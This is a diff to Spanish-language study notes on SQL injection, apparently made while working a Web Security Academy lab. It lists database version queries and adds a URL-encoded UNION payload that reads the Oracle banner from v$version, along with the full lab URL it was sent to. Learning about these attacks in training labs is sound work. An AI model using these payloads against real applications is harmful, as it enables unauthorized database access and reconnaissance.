@@ -60,8 +60,11 @@ para mostrar la informacion es necesario hacer uso del [UNION] flag.
 
 Microsoft : SELECT @@version
 MySQL : SELECT @@version
-Oracle : SELECT * FROM v$version
+Oracle : SELECT * FROM v$version | %27%20UNION%20select%20banner,%20null%20from%20v$version--
 PostgreSQL : SELECT version()
 
 ' UNION SELECT @@version--
+
+https://0a1c00f10374a73ac002407000d400b6.web-security-academy.net/filter?category=Accessories%27%20UNION%20select%20banner,%20null%20from%20v$version--
+es importante notar que el query va a ser igual, si son 2 columnas, se va a utilizar las dos columnas en la consulta. 
 
